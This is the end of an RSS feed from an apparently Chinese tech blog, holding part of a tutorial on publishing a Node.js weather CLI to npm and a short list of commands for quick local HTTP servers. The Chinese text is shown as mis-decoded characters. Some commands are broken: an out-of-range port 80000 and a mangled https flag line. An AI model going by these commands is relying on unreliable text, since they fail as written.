    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// å…³é—­è¿›åº¦&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;spinner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿™é‡Œåœ¨ &lt;strong&gt;yahoo.js&lt;/strong&gt; ä¸­å°è£…äº†è°ƒç”¨æ¸©åº¦çš„æ¥å£ï¼Œåœ¨å‘½ä»¤æ–‡ä»¶ &lt;strong&gt;today.js&lt;/strong&gt; ä¸­è¿›è¡Œè°ƒç”¨ï¼ŒåŠ è½½è¿›åº¦å¹¶è§£æè¿”å›å€¼ï¼Œå½“è¾“å…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today --location &quot;BeiJing, ZH&quot; &lt;/code&gt; æ—¶ï¼Œå°†ä¼šè¾“å‡ºæŒ‡å®šåŸå¸‚çš„æ°”æ¸©ï¼Œæ³¨æ„è¿™é‡Œåªæ˜¯ä¸ªç¤ºä¾‹ï¼Œåªå–äº†è¿”å›å€¼çš„ temp å­—æ®µã€‚&lt;/p&gt;

&lt;h3 id=&quot;45-é”™è¯¯ä¸é€€å‡ºç &quot;&gt;4.5 é”™è¯¯ä¸é€€å‡ºç &lt;/h3&gt;

&lt;p&gt;è‡³æ­¤æˆ‘ä»¬çš„ç¨‹åºç»“æŸäº†å—ï¼Ÿæ²¡æœ‰ã€‚å¦‚æœä½ çš„ cli ç¨‹åºæœ‰ä¸¥é‡é”™è¯¯ï¼Œåº”è¯¥ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;process.exit(1)&lt;/code&gt; çš„æ–¹å¼è¿›è¡Œé€€å‡ºï¼Œè¿™å¯ä»¥å‘Šè¯‰ç»ˆç«¯æ­¤è¿›ç¨‹å¼‚å¸¸ç»ˆæ­¢ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[utils/error.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./utils/error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// console.error(`&quot;${cmd}&quot; is not a valid command!`)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; is not a valid command!`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;5-å‘å¸ƒåˆ°npmä»“åº“&quot;&gt;5. å‘å¸ƒåˆ°NPMä»“åº“&lt;/h2&gt;

&lt;p&gt;ä¸ºäº†è®©æ›´å¤šäººå¯ä»¥ä½¿ç”¨åˆ°ä½ ç¼–å†™çš„ nodejs åº“ï¼Œåº”è¯¥ä¸Šä¼ åˆ° npm ä»“åº“ä¸­ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸ªä¾‹å­ï¼Œä¸ºäº†èƒ½å¤Ÿä¸Šä¼ ï¼Œéœ€è¦å®Œå–„ &lt;strong&gt;package.json&lt;/strong&gt; æ–‡ä»¶&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A cli app that gives you the weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;homepage&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://github.com/wangjunneil/weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;repository&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git+https://github.com/wangjunneil/weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;engines&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;node&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;=8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vinny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;preferGlobal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin/weather&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;axios&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^0.18.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;minimist&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^1.2.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ora&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^2.1.0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;engine è®¾ç½®å‘Šè¯‰å®‰è£…äººå‘˜ä½¿ç”¨ node çš„æœ€æ–°ç‰ˆæœ¬ï¼Œç”±äºä½¿ç”¨äº† async å’Œ await è¯­æ³•ï¼Œå› æ­¤éœ€è¦8.0æˆ–æ›´é«˜çš„ç‰ˆæœ¬ã€‚&lt;/li&gt;
  &lt;li&gt;preferGlobal çš„è®¾ç½®æ˜¯è‹¥ç”¨æˆ·ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --save&lt;/code&gt; è€Œä¸æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --gobal&lt;/code&gt; çš„æ–¹å¼è¿›è¡Œå®‰è£…ï¼Œå°†ä¼šå‘å‡ºè­¦å‘Šã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é¦–æ¬¡ä¸Šä¼ çš„è¯ä½ éœ€è¦æœ‰ npm çš„è´¦å·ä¿¡æ¯ï¼Œè‹¥æ²¡æœ‰è¯·å» &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;https://www.npmjs.com/&lt;/a&gt; è¿›è¡Œæ³¨å†Œï¼Œæ³¨å†Œå®Œæˆåï¼Œå…ˆä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm adduser&lt;/code&gt; å°†è´¦å·ä¿¡æ¯åœ¨ç”µè„‘ä¸­è¿›è¡ŒéªŒè¯ï¼Œæœ€ååœ¨æ ¹è·¯å¾„ä¸­æ‰§è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm publish&lt;/code&gt; å‘½ä»¤è¿›è¡Œå‘å¸ƒå³å¯ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;æœ¬æ–‡ä¸­æ‰€æœ‰çš„ç¤ºä¾‹ä»£ç åœ¨ &lt;a href=&quot;https://github.com/wangjunneil/weather-cli&quot;&gt;https://github.com/wangjunneil/weather-cli&lt;/a&gt; å¯ä»¥è·å–åˆ°&lt;/p&gt;
&lt;/blockquote&gt;
</description>  
               <pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2018/05/create-publish-nodejs-cli/</link>  
               <guid isPermaLink="true">http://localhost:4000/2018/05/create-publish-nodejs-cli/</guid>  
               </item>  
          
            <item>  
               <title>å¿«é€Ÿåˆ›å»ºç®€æ˜“HTTPæœåŠ¡å™¨çš„æ–¹å¼</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-python-æ–¹å¼&quot; id=&quot;markdown-toc-1-python-æ–¹å¼&quot;&gt;1. Python æ–¹å¼&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-php-æ–¹å¼&quot; id=&quot;markdown-toc-2-php-æ–¹å¼&quot;&gt;2. Php æ–¹å¼&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-ruby-æ–¹å¼&quot; id=&quot;markdown-toc-3-ruby-æ–¹å¼&quot;&gt;3. Ruby æ–¹å¼&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-npm-æ–¹å¼&quot; id=&quot;markdown-toc-4-npm-æ–¹å¼&quot;&gt;4. NPM æ–¹å¼&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-python-æ–¹å¼&quot;&gt;1. Python æ–¹å¼&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 8000
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;2-php-æ–¹å¼&quot;&gt;2. Php æ–¹å¼&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 0.0.0.0:80000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;3-ruby-æ–¹å¼&quot;&gt;3. Ruby æ–¹å¼&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby &lt;span class=&quot;nt&quot;&gt;-rwebrick&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WEBrick::HTTPServer.new(:Port =&amp;gt; 8000, :DocumentRoot =&amp;gt; Dir.pwd).start&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;4-npm-æ–¹å¼&quot;&gt;4. NPM æ–¹å¼&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# install&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;npm i &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; http-server
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;http-server &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c-1&lt;/span&gt; dist/

&lt;span class=&quot;c&quot;&gt;# https&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;http-server &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; â€”p433 C localhost.pem &lt;span class=&quot;nt&quot;&gt;-K&lt;/span&gt; localhost-key.pem dist/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>  
               <pubDate>Mon, 07 May 2018 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2018/05/http-server-ways/</link>  
               <guid isPermaLink="true">http://localhost:4000/2018/05/http-server-ways/</guid>  
               </item>  
          
    </channel>  
</rss>
